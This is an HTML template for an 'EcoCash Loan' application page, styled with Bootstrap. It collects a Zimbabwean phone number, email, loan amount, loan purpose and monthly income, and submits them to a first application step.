<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loan Application — EcoCash</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        :root {
            --bg: #0b1118;
            --card: #121b26;
            --elevated: #182433;
            --accent: #00b86b;
            --accent-hover: #009e5b;
            --text: #f4f7fb;
            --muted: #94a3b8;
            --border: rgba(255, 255, 255, 0.08);
        }
        body {
            margin: 0;
            min-height: 100vh;
            background: radial-gradient(circle at top, #132234 0%, var(--bg) 65%);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, sans-serif;
            padding: 20px 16px 36px;
        }
        .wrap { max-width: 440px; margin: 0 auto; }
        .card-modern {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 22px;
            padding: 24px 20px;
            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
        }
        .form-control, .form-select {
            background: var(--elevated);
            border: 1px solid rgba(255,255,255,0.12);
            color: var(--text);
            border-radius: 12px;
            padding: 12px 14px;
        }
        .form-control:focus, .form-select:focus {
            background: var(--elevated);
            color: var(--text);
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(0, 184, 107, 0.18);
        }
        .form-control::placeholder { color: #64748b; }
        .prefix-box {
            background: var(--elevated);
            border: 1px solid rgba(255,255,255,0.12);
            border-radius: 12px;
            padding: 12px 14px;
            font-weight: 600;
            white-space: nowrap;
        }
        .btn-eco {
            background: var(--accent);
            color: #05120c;
            font-weight: 700;
            border: none;
            border-radius: 14px;
            padding: 14px;
            width: 100%;
        }
        .btn-eco:hover { background: var(--accent-hover); color: #05120c; }
    </style>
</head>
<body>
    <div class="wrap">
        <div class="card-modern">
            <h2 class="fw-bold fs-4 mb-1">EcoCash Loan</h2>
            <p class="small mb-4" style="color: var(--muted);">Complete your details to begin verification.</p>

            <form action="/apply/step1" method="POST">
                <div class="mb-3">
                    <label class="form-label small fw-medium">Phone Number</label>
                    <div class="d-flex gap-2">
                        <div class="prefix-box">🇿🇼 +263</div>
                        <input type="tel" class="form-control" name="phone" placeholder="77 000 0000" required>
                    </div>
                </div>

                <div class="mb-3">
                    <label class="form-label small fw-medium">Email Address</label>
                    <input type="email" class="form-control" name="email" placeholder="name@example.com" required>
                </div>

                <div class="mb-3">
                    <label class="form-label small fw-medium">Loan Amount (USD)</label>
                    <input type="number" class="form-control" name="amount" min="50" max="5000"
                        value="{{ session.get('amount', '') }}" placeholder="50 - 5000" required>
                </div>

                <div class="mb-3">
                    <label class="form-label small fw-medium">Purpose of Loan</label>
                    <select class="form-select" name="purpose" required>
                        <option value="" selected disabled>Select purpose</option>
                        <option value="Business & Trading">Business & Trading</option>
                        <option value="Personal Expenses">Personal Expenses</option>
                        <option value="Bills & Utilities">Bills & Utilities</option>
                        <option value="Emergency">Emergency</option>
                    </select>
                </div>

                <div class="mb-4">
                    <label class="form-label small fw-medium">Monthly Income (USD)</label>
                    <input type="number" class="form-control" name="income" min="0" placeholder="e.g. 350" required>
                </div>

                <button type="submit" class="btn-eco shadow-sm">Submit Application</button>
            </form>
        </div>
    </div>
</body>
</html>
